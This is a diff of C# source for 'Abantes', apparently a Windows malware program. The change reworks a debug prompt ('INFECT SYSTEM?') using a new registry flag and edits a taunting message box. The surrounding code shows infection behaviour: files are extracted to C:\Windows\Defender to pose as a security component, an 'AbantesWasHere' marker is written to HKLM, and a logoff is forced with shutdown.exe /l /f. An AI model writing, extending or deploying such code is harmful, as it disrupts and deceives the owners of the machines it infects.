@@ -28,12 +28,38 @@ namespace Abantes
         {
             InitializeComponent();
 
+            RegistryKey editKey;
+
             if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null)
-            { } else { if (MessageBox.Show("INFECT SYSTEM?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No) { Environment.Exit(0); } MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, 0); Mode = 1; }
+            {
 
-            RegistryKey editKey;
+            }
+            else
+            {
+                if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "DebugInfectMsg", null) == null)
+                {
+                    if (MessageBox.Show("INFECT SYSTEM?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
+                    {
+                        Environment.Exit(0);
+                    }
+                    else
+                    {
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Abantes");
+                        editKey.SetValue("DebugInfectMsg", "1");
+                        editKey.Close();
+                    }
+                    MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, MessageBoxIcon.Warning);
+                    Mode = 1;
+                }
+                else
+                {
+                    MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, 0);
+                    Mode = 1;
+                }
+            }
+            
             string extractPath = @"C:\Windows\Defender";
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
@@ -386,7 +412,7 @@ namespace Abantes
 
                 Thread.Sleep(9000);
 
-                MessageBox.Show("Abantes Wants To Meet You", "Abantes Want Too Meet You");
+                MessageBox.Show("Abantes Wants To Meet You", "Abantes Wants Meet You", 0, MessageBoxIcon.Warning);
 
                 Others.StartProcess("shutdown.exe", "/l /f");
             }
